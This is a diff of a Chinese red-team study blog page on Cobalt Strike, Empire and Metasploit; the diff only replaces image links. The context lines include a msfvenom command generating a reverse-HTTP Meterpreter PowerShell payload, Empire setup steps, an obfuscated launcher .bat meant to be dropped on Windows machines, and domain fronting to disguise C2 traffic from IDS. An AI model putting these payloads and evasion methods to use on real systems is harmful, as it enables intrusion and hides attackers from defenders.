@@ -2169,7 +2169,7 @@
 
 <p>本机运行cobalstrike.jar</p>
 <p>输入密码即可，端口未自定义就默认完事</p>
-<p>![image-20210126012100233](../../../Library/Application Support/typora-user-images/image-20210126012100233.png)</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0h5ne7gnj313e0is40k.jpg" alt="image-20210126012100233"></p>
 <h4 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h4><p>此工具也是神器，对域渗透支持挺不错，博客中也介绍过此工具的基本使用方法。个人使用的话，感觉不是很稳定。(可能因为服务器原因)</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;EmpireProject&#x2F;Empire.git</span><br><span class="line"></span><br><span class="line">切换至工具目录setup下</span><br><span class="line">	.&#x2F;install.sh</span><br><span class="line">出现setip comlete则安装成功</span><br><span class="line">	.&#x2F;reset.sh</span><br></pre></td></tr></table></figure>
 
@@ -2185,13 +2185,13 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -payload windows&#x2F;x64&#x2F;meterpreter_reverse_http -format psh -out meterpreter- 64.ps1 LHOST&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure>
 
 <p>我们甚至可以将混淆提升到新的水平，并使用 Unicorn 等工具生成更多模糊的基于 PowerShell 的 Meterpreter payload，我们将在本书中详细介绍这些混淆器。</p>
-<p>![image-20210126012550001](../../../Library/Application Support/typora-user-images/image-20210126012550001.png)</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0h5pxo99j31c2094n4n.jpg" alt="image-20210126012550001"></p>
 <p>此外，使用受信任的机构签发的 SSL/TLS 证书可以帮助我们绕过某些网络中的 IDS（入侵检测系统），具体可以参考以下链接实现：Meterpreter Paranoid Mode。</p>
 <p>最后，在本书的后面部分，我们将讨论如何重新编译利用 Metasploit/Meterpreter 来绕过基于主机和网络的检测工具。（比较期待）</p>
 <h2 id="Cobalt-Strike-1"><a href="#Cobalt-Strike-1" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><p>什么是 Cobalt Strike 呢？它是一种用来后期持久渗透，横向移动，流量隐藏、数据窃取的工具。 Cobalt Strike 并没有直接的漏洞利用，也没有通过最新的 0-Day 漏洞来破坏系统。当你已经在服务器上执行了 CS 的恶意代码或者将 CS 用作网络钓鱼活动的一部分时，你就能感受到 CS的功能是多么广泛并且强大。 一旦你可以在机器上执行 Cobalt Strike 的 payload，它创建一个 Beacon(远控木马功能)连接回连到 C2 服务器（teamserver）。</p>
 <h3 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h3><p>类似于cdn技术，使用一个正常的域名解析到我们的c2服务器上面，隐藏恶意的流量，这样可规避某些安全监测。</p>
-<p>![image-20210126013131538](../../../Library/Application Support/typora-user-images/image-20210126013131538.png)</p>
-<p>![image-20210126013218086](../../../Library/Application Support/typora-user-images/image-20210126013218086.png)</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0h5nwy93j315u0oeabk.jpg" alt="image-20210126013131538"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0h5odk0gj30u00v9gow.jpg" alt="image-20210126013218086"></p>
 <p>通过更改 HTTP 主机的 header，CDN 将很轻松的的的地把流量传输回到正确的服务器。红队一直使用这种技术通过使用高信誉域名来隐藏 C2 服务器的流量。</p>
 <p>PS：科学上网</p>
 <p>使用谷歌产品伪装c2服务器</p>
@@ -2280,7 +2280,7 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execute</span><br></pre></td></tr></table></figure>
 
-<p>![image-20210126014652875](../../../Library/Application Support/typora-user-images/image-20210126014652875.png)</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0h5oyewkj31bf0u0n9r.jpg" alt="image-20210126014652875"></p>
 <h3 id="配置-Payload"><a href="#配置-Payload" class="headerlink" title="配置 Payload"></a><strong>配置</strong> <strong>Payload</strong></h3><p>payload 是将在受害者系统上运行的实际恶意软件。 这些 payload 可以在 Windows，Linux 和 OSX 中运行，但</p>
 <p>Empire 以其基于 PowerShell Windows 的 Payload 而闻名：</p>
 <ul>
@@ -2313,7 +2313,7 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;tmp&#x2F;launcher.bat</span><br></pre></td></tr></table></figure>
 
-<p>![image-20210126014935177](../../../Library/Application Support/typora-user-images/image-20210126014935177.png)</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0h5pevzij31ic0huqga.jpg" alt="image-20210126014935177"></p>
 <p>如你所见，创建的 payload 被严重混淆。 你现在可以把这个 .bat 文件丢到任何 Windows 系统上。 当然，你可能会创建一个 Offiffiffice 宏文件或一个USB橡皮鸭（注：USB RUBBER DUCKY/USB 橡皮鸭是最早的按键注入工具）的payload，但这只是众多示例中的一个。</p>
 <p>如果你尚未在 Kali 图形界面上安装 PowerShell，那么最好的方法是手动安装它。 在 Kali 上安装 PowerShell：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install libunwind8 </span><br><span class="line"></span><br><span class="line">wget http:&#x2F;&#x2F;security.debian.org&#x2F;debian- security&#x2F;pool&#x2F;updates&#x2F;main&#x2F;o&#x2F;openssl&#x2F;libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb </span><br><span class="line"></span><br><span class="line">dpkg -i libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb </span><br><span class="line"></span><br><span class="line">wget http:&#x2F;&#x2F;security.ubuntu.com&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;i&#x2F;icu&#x2F;libicu55_55.1- 7ubuntu0.3_amd64.deb </span><br><span class="line"></span><br><span class="line">dpkg -i libicu55_55.1-7ubuntu0.3_amd64.deb </span><br><span class="line"></span><br><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;PowerShell&#x2F;PowerShell&#x2F;releases&#x2F;download&#x2F;v6.0.2&#x2F;powershell_6.0.2- 1.ubuntu.16.04_amd64.deb </span><br><span class="line"></span><br><span class="line">dpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb</span><br></pre></td></tr></table></figure>
